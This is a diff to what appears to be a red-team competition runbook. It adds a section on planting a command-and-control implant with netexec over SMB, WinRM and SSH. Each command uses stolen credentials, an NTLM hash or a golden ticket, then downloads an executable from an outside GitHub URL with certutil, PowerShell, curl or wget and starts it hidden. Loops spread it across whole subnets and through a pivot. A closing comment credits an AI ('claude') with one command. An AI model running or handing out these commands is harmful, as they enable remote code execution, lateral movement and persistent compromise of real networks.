@@ -172,6 +172,66 @@ proxychains4 -q -f /tmp/proxychains_team<T>.conf forgegold -x <T>
 
 ---
 
+## Plant C2 Without Scripts
+
+Default C2 URL: `https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe`
+
+### Single Host — certutil + start (via SMB)
+
+```bash
+# With password
+netexec smb <IP> -u Administrator -p 'Th3cake1salie!' -d aperturesciencelabs.org -x "certutil -urlcache -split -f \"https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe\" \"C:\Windows\Temp\svc.exe\" >nul 2>nul & start /b \"\" \"C:\Windows\Temp\svc.exe\""
+
+# With golden ticket
+export KRB5CCNAME=team<T>.ccache
+netexec smb <IP> -u chell --use-kcache -x "certutil -urlcache -split -f \"https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe\" \"C:\Windows\Temp\svc.exe\" >nul 2>nul & start /b \"\" \"C:\Windows\Temp\svc.exe\""
+
+# With NTLM hash
+netexec smb <IP> -u Administrator -H '<NTLM>' -d aperturesciencelabs.org -x "certutil -urlcache -split -f \"https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe\" \"C:\Windows\Temp\svc.exe\" >nul 2>nul & start /b \"\" \"C:\Windows\Temp\svc.exe\""
+```
+
+### Single Host — PowerShell IWR (via WinRM)
+
+```bash
+netexec winrm <IP> -u Administrator -p 'Th3cake1salie!' -d aperturesciencelabs.org -X "$p='C:\Windows\Temp\svc.exe';IWR -Uri 'https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe' -OutFile $p;Start-Process $p -WindowStyle Hidden"
+```
+
+### All Hosts on a Team — One Loop
+
+```bash
+# certutil via SMB (password auth)
+for ip in 192.168.20<T>.140 192.168.20<T>.10 192.168.20<T>.11 192.168.20<T>.70 192.168.20<T>.71 192.168.20<T>.141 192.168.20<T>.72; do
+  echo "[*] Planting on $ip..."
+  netexec smb "$ip" -u Administrator -p 'Th3cake1salie!' -d aperturesciencelabs.org -x "certutil -urlcache -split -f \"https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe\" \"C:\Windows\Temp\svc.exe\" >nul 2>nul & start /b \"\" \"C:\Windows\Temp\svc.exe\""
+done
+
+# Same but with golden ticket
+export KRB5CCNAME=team<T>.ccache
+for ip in 192.168.20<T>.140 192.168.20<T>.10 192.168.20<T>.11 192.168.20<T>.70 192.168.20<T>.71 192.168.20<T>.141 192.168.20<T>.72; do
+  echo "[*] Planting on $ip..."
+  netexec smb "$ip" -u chell --use-kcache -x "certutil -urlcache -split -f \"https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe\" \"C:\Windows\Temp\svc.exe\" >nul 2>nul & start /b \"\" \"C:\Windows\Temp\svc.exe\""
+done
+```
+
+### Internal Hosts via Proxychains
+
+```bash
+# Through a pivot
+for ip in 172.16.3.140 172.16.1.10 172.16.1.11 172.16.2.70 172.16.2.71 172.16.3.141 172.16.2.72; do
+  echo "[*] Planting on $ip..."
+  proxychains4 -q -f /tmp/proxychains_team<T>.conf netexec smb "$ip" -u Administrator -p 'Th3cake1salie!' -d aperturesciencelabs.org -x "certutil -urlcache -split -f \"https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe\" \"C:\Windows\Temp\svc.exe\" >nul 2>nul & start /b \"\" \"C:\Windows\Temp\svc.exe\""
+done
+```
+
+### Linux Host (SSH)
+
+```bash
+netexec ssh <IP> -u Administrator -p 'Th3cake1salie!' -x "curl -sSLo /tmp/svc 'https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe' || wget -qO /tmp/svc 'https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe'; chmod +x /tmp/svc; nohup /tmp/svc </dev/null &>/dev/null &"
+```
+lol claude put a command for putting exe on linux
+
+---
+
 ## Netexec (Manual Auth Commands)
 
 ```bash
